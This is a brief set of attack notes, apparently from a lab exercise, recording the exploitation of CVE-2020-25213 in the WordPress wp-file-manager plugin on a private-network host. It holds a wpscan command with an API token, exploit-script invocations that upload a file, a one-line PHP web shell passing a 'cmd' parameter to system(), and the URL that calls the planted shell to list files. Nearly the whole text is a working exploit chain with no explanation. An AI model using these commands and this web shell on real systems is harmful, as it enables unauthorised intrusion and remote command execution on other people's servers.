# colab
wpscan --url http://192.168.80.133:8000/ --api-token NMtjfXnMnhiNDVIAMES84ZqNDwhvJMoxtnsq9w9QqSg --plugins-version-detection aggressive
https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213
/wp-file-manager-exploit.sh -u http://192.168.80.133:8000 --check
./wp-file-manager-exploit.sh -u http://192.168.80.133:8000 -f ~/v10cr/wp/wp-file-manager-CVE-2020-25213/shell.php --verbose
<?php system($_GET['cmd']);?>
http://192.168.80.133:8000/wp-content/plugins/wp-file-manager/lib/php/../files/shell.php?cmd=ls%20-al
